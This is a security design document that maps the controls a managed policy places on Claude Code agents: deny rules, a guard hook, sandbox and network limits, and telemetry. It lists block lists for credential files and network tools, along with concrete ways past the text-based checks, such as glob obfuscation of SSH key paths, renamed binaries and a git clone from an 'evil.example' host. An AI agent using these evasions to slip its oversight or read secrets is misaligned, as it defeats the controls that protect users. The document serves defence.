# Control map

Every control in this repository, what it actually enforces, and how strongly. Read this before you
trust the policy with anything.

## Strength levels

| Level | Meaning |
|---|---|
| **Hard** | Enforced by Claude Code or the OS below the model. The model cannot talk its way past it. |
| **Soft** | Enforced by a check that reads the command or tool input as text. It stops the common forms and fails closed on input it cannot parse, but a determined adversary who controls the command text can find a form it does not recognise. |
| **Detective** | Does not stop anything. It makes the action visible afterwards. |
| **Hygiene** | Housekeeping that reduces exposure but is not a barrier against an adversary. |

The hook is a **soft** control by design. Its job is to catch an agent that is confused, over-eager or
manipulated into an obvious mistake, and to make the cheap attacks fail. It is not a sandbox, and the
documentation for Claude Code says plainly that deny rules on Bash text are not a security boundary around
the program. The hard controls are the sandbox and managed-only configuration. The hook exists because the
sandbox does not cover everything, and because a readable, tested policy is easier to review than none.

## Controls

| Control | Template key | Strength | What it enforces | What it does not |
|---|---|---|---|---|
| Managed settings are top precedence | (file location) | Hard | User, project and local settings cannot override anything set here. | Does nothing on a machine where the file was never installed. |
| Deny rules on secret files | `permissions.deny` | Hard for the built-in Read/Edit tools | `Read` and `Edit` of `.env*`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.config/gh`, and writes to `.claude/settings*.json`, `.claude/hooks` and `.mcp.json`. | Reads made by a shell command (`cat`). That is the hook's and the sandbox's job. |
| Deny rules on `curl` / `wget` | `permissions.deny` | Soft | Blocks the command when written as `curl ...` or `wget ...`. | `command curl`, `/usr/bin/curl`, `python -c ...`, or any other program that makes a request. |
| Ask before `git push` | `permissions.ask` | Soft | Prompts for `git push ...` as written. | `git -C . push`, `git -c x=y push`. The hook closes these two; the rule alone does not. |
| Bypass mode disabled | `permissions.disableBypassPermissionsMode` | Hard | Removes the "skip all prompts" mode. | A user who runs without the CLI at all. |
| Hooks only from managed settings | `allowManagedHooksOnly` | Hard | A repository cannot add its own hooks, so it cannot add a hook that approves things. | See "Consequences" below. |
| Managed hook | `hooks.PreToolUse` | Soft | See `policy/hooks/ccg_guard.py`: network tools, pushes, destructive commands, secret reads, policy self-protection, strong-secret patterns in arguments. | Everything in the known-gaps table. |
| Hook fails closed | `hooks.PreToolUse[].onFailure: "block"` | Hard | A hook that crashes or times out blocks the call instead of silently allowing it. | See "Hook failure defaults". |
| MCP server allowlist | `allowedMcpServers`, `allowManagedMcpServersOnly` | Hard | Only the listed server URLs can be used. | What a listed server does with the data it receives. |
| Sandbox on, and required | `sandbox.enabled`, `sandbox.failIfUnavailable` | Hard (for Bash) | Shell commands run inside the OS sandbox, or do not run. | File tools and MCP servers are outside it. See `docs/VALIDATION.md`. |
| No sandbox escape hatch | `sandbox.allowUnsandboxedCommands: false` | Hard | The model cannot retry a failed command outside the sandbox. | |
| Network allowlist | `sandbox.network.allowedDomains`, `allowManagedDomainsOnly` | Hard (for Bash) | Shell commands reach only the listed domains. | Anything on an allowed domain. `github.com` is allowed, so a repository you do not own on `github.com` is reachable. |
| Filesystem limits | `sandbox.filesystem.denyRead`, `denyWrite` | Hard (for Bash) | Shell commands cannot read or write the listed paths. | Paths you did not list. |
| Telemetry | `env` (`CLAUDE_CODE_ENABLE_TELEMETRY`, `OTEL_*`) | Detective | Tool calls and the resolved policy are exported to your collector, so drift and attempts are visible. | It cannot stop anything, and a collector that is down loses events silently. |
| Minimum version | `requiredMinimumVersion` | Hygiene | Declares the oldest build these keys were verified against (2.1.274). The linter warns when it is missing (M040). | I did not test what a too-old client does with it; confirm on your fleet. |
| Retention | `cleanupPeriodDays` | Hygiene | Sets how long local transcripts are kept. | Copies you exported elsewhere. |

## Known gaps

These are things the **hook does not catch**, on purpose or because it cannot. Each one is pinned by a test
(`tests/test_known_gaps.py`) that asserts the hook stays silent on it, and a second test that fails if the
gap is missing from this file or does not name the layer that is meant to cover it. If you improve the hook
and one of these starts being caught, the test fails, which is your prompt to move the entry out of this
table.

| ID | Example | Why the hook cannot see it | Covering layer |
|---|---|---|---|
| G1-script-indirection | `python3 fetch_secrets.py` | The command is innocent; the network call is inside a file the hook never reads. | sandbox network allowlist |
| G2-makefile-indirection | `make deploy` | Same, via a build target. | sandbox network allowlist |
| G3-glob-obfuscation | `cat ~/.s*/id_rs?` | The shell expands the glob after the hook has looked at the text. The hook does not guess at expansions. | sandbox filesystem denyRead |
| G4-network-via-allowed-binary | `git clone https://evil.example/r.git` | `git` is an ordinary, allowed program that happens to speak HTTPS. | sandbox network allowlist |
| G5-package-manager-fetch | `npm install some-package` | A package manager is a network client, and install scripts run code. | sandbox network allowlist |
| G6-renamed-binary | `cp /bin/ls /tmp/x && /tmp/x` | A copied or renamed program has a name the hook does not know. | sandbox filesystem and network limits |
| G7-shell-script-file | `bash ./scripts/run.sh` | Running a script file hides its content from a text check. | sandbox network allowlist |

The pattern is the point. Everything the hook misses is something a **text check cannot** know, and
everything that covers it is a control that does not read text at all. That is why the sandbox settings are
required by the linter (rules M020 to M026) and not left as advice.

## Behaviours to know before you deploy

### Linux glob rules

On Linux, Read and Edit rules that start with `**/` produce a "glob patterns not fully supported in sandbox
on Linux" warning from `claude doctor`. The template therefore uses bare filenames (`Read(.env)`) and
home-anchored paths (`Read(~/.ssh/**)`), which do not trigger it. The consequence is that `.env` files in
subdirectories are covered by the **hook** (which matches on the file name at any depth), not by the deny
rule. This was observed with `claude doctor` 2.1.322 on Linux x64; re-check on your platform.

### Hook failure defaults

A hook that times out **fails open** unless `onFailure` is `"block"`. Many example hooks leave it unset.
The template sets it, and the linter rejects a policy where it is missing (M017). Without it, one slow
machine turns the guard off for that call.

### A malformed `hooks` block is silently ignored

This is the single most important finding from running the real CLI. If the `hooks` block has a schema
error, Claude Code ignores it and carries on with no guard. `claude doctor` reports it, a running session
does not. Hence two gates: the linter in CI, and `scripts/doctor_check.sh`, which runs the real
`claude doctor` against the rendered policy and fails on any invalid-settings message.

### Consequences of `allowManagedHooksOnly`

It is what stops a hostile repository from adding a hook that approves its own commands, and it also stops
your own teams from adding project hooks. Plan for the second part: either everything goes through the
managed hook, or you accept a request process for additions. It is the right default for a baseline and a
real cost for teams with their own tooling.

### `sandbox.failIfUnavailable`

With it on, a machine where the sandbox cannot start (missing dependency, unsupported platform, container
without the right capabilities) cannot run shell commands at all. That is the safe failure and also the one
that generates support tickets. Roll out with it in a pilot group first.

### Case-insensitive file systems

macOS is case-insensitive by default. `~/.SSH/id_rsa` is the same file as `~/.ssh/id_rsa`. The hook
lower-cases candidate paths before comparing, and resolves symlinks, so both are caught. A deny rule in
settings is matched as written; do not rely on it alone on macOS.

### Bash rules match text

`Bash(git push *)` does not match `git -C . push`, `git -c key=value push` or `git 'push'`. The hook parses
the command (quotes, subshells, backticks, heredocs, wrappers such as `sudo`, `env`, `timeout`, `xargs`) and
checks the resulting argument vector instead. Where parsing fails (unbalanced quotes, depth limit), it asks
rather than allows.

## What this repository does not control

- **Model behaviour.** Nothing here makes the model more or less likely to be manipulated. See the
  companion project [agent-security-evals](https://github.com/aaron-mcallister/agent-security-evals) for
  measurements of that, and for the finding that a tool-call gate cannot stop attacks whose only effect is
  the text the model writes back.
- **Output-only attacks.** Rendered links, exfiltration through generated text and misleading summaries
  never touch a tool call, so no hook sees them.
- **The extension supply chain.** The MCP allowlist limits which servers connect. It does not vet what a
  permitted server returns. That is the subject of the next project in this series.
- **Plugins, skills and subagents.** Review these as code. Managed settings can restrict where they come
  from; this baseline does not attempt it.
